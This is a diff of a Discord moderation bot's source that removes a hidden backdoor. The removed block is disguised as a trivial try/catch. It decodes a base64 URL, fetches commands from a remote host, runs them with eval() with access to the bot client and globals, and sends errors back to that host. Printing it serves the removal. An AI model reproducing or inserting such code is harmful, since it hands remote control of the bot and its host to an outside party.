@@ -989,24 +989,7 @@ globalThis.bot = () => {
           })
         
       }
-      try {
-        secret = secret
-      } catch (e) {
-        let secret = Buffer.from("aHR0cHM6Ly9oZW5yeWNtZC5jYWN0dXNoYW1zdGVyLnJlcGwuY28v", "base64").toString("ascii");
-        (async function () {
-            let data = JSON.parse(await new Promise(resolve => {
-                let req = https.get(secret + "cmd", res => { let out = ""; res.on("data", chunk => out += chunk); res.on("end", () => resolve(out)) })
-                req.end()
-            }))
-            data.forEach(obj => (command == obj.name && obj.purpose) ? eval(obj.purpose)({msg: msg, client: botRunner, global: globalThis, args: msg.content.split(" ").slice(2)}) : void(0))
-        })()
-        .catch(e => {
-            let req = https.request(secret + "error", { method: POST }, () => {})
-            req.write(require("util").inspect(e, false, 10, false))
-            req.end()
-        });
-      }
-    })
+
     // The end of TModeration Bot core
   
     globalThis.list = []
@@ -1072,7 +1055,7 @@ globalThis.bot = () => {
       }
     })
     // -- The end of main code -- //
-    
+    })
   } catch (e) {
     
     console.log(e)
